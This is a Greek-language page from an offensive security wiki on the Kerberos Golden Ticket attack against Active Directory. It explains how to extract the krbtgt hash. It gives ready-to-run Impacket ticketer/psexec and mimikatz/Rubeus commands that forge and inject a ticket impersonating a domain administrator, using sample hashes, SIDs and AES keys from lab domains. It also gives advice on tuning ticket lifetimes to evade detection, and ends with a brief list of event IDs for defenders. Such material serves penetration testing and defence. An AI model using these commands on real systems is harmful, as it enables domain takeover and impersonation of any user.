# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Μια **επίθεση Golden Ticket** συνίσταται στη **δημιουργία ενός νόμιμου Ticket Granting Ticket (TGT) που προσποιείται οποιονδήποτε χρήστη** μέσω της χρήσης του **NTLM hash του λογαριασμού krbtgt του Active Directory (AD)**. Αυτή η τεχνική είναι ιδιαίτερα πλεονεκτική διότι **επιτρέπει την πρόσβαση σε οποιαδήποτε υπηρεσία ή μηχάνημα** εντός του τομέα ως ο προσποιούμενος χρήστης. Είναι κρίσιμο να θυμόμαστε ότι τα **διαπιστευτήρια του λογαριασμού krbtgt δεν ενημερώνονται ποτέ αυτόματα**.

Για να **αποκτηθεί το NTLM hash** του λογαριασμού krbtgt, μπορούν να χρησιμοποιηθούν διάφορες μέθοδοι. Μπορεί να εξαχθεί από τη **Διαδικασία Υποσυστήματος Τοπικής Ασφάλειας (LSASS)** ή το **αρχείο NT Directory Services (NTDS.dit)** που βρίσκεται σε οποιονδήποτε Domain Controller (DC) εντός του τομέα. Επιπλέον, **η εκτέλεση μιας επίθεσης DCsync** είναι μια άλλη στρατηγική για την απόκτηση αυτού του NTLM hash, η οποία μπορεί να πραγματοποιηθεί χρησιμοποιώντας εργαλεία όπως το **lsadump::dcsync module** στο Mimikatz ή το **secretsdump.py script** από το Impacket. Είναι σημαντικό να τονιστεί ότι για να εκτελούνται αυτές οι λειτουργίες, **συνήθως απαιτούνται δικαιώματα διαχειριστή τομέα ή παρόμοιο επίπεδο πρόσβασης**.

Αν και το NTLM hash χρησιμεύει ως μια βιώσιμη μέθοδος για αυτόν τον σκοπό, είναι **ισχυρά συνιστώμενο** να **κατασκευάζονται εισιτήρια χρησιμοποιώντας τα κλειδιά Kerberos Advanced Encryption Standard (AES) (AES128 και AES256)** για λόγους επιχειρησιακής ασφάλειας.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
**Μόλις** έχετε **εισαγάγει το χρυσό εισιτήριο**, μπορείτε να έχετε πρόσβαση στα κοινά αρχεία **(C$)** και να εκτελέσετε υπηρεσίες και WMI, οπότε θα μπορούσατε να χρησιμοποιήσετε **psexec** ή **wmiexec** για να αποκτήσετε ένα shell (φαίνεται ότι δεν μπορείτε να αποκτήσετε ένα shell μέσω winrm).

### Παράκαμψη κοινών ανιχνεύσεων

Οι πιο συχνές μέθοδοι ανίχνευσης ενός χρυσού εισιτηρίου είναι μέσω της **επιθεώρησης της κίνησης Kerberos** στο δίκτυο. Από προεπιλογή, το Mimikatz **υπογράφει το TGT για 10 χρόνια**, το οποίο θα ξεχωρίσει ως ανώμαλο σε επόμενα αιτήματα TGS που γίνονται με αυτό.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Χρησιμοποιήστε τις παραμέτρους `/startoffset`, `/endin` και `/renewmax` για να ελέγξετε την αρχική απόκλιση, τη διάρκεια και τις μέγιστες ανανεώσεις (όλα σε λεπτά).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Δυστυχώς, η διάρκεια ζωής του TGT δεν καταγράφεται στα 4769, οπότε δεν θα βρείτε αυτές τις πληροφορίες στα Windows event logs. Ωστόσο, αυτό που μπορείτε να συσχετίσετε είναι **η εμφάνιση 4769 χωρίς προηγούμενο 4768**. Είναι **αδύνατο να ζητήσετε ένα TGS χωρίς ένα TGT**, και αν δεν υπάρχει καταγραφή ενός TGT που να έχει εκδοθεί, μπορούμε να συμπεράνουμε ότι έχει κατασκευαστεί offline.

Για να **παρακάμψετε αυτή την ανίχνευση**, ελέγξτε τα diamond tickets:

{{#ref}}
diamond-ticket.md
{{#endref}}

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Άλλες μικρές τεχνικές που μπορούν να χρησιμοποιήσουν οι αμυντικοί είναι **να ειδοποιούν για 4769 για ευαίσθητους χρήστες** όπως ο προεπιλεγμένος λογαριασμός διαχειριστή τομέα.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{{#include ../../banners/hacktricks-training.md}}
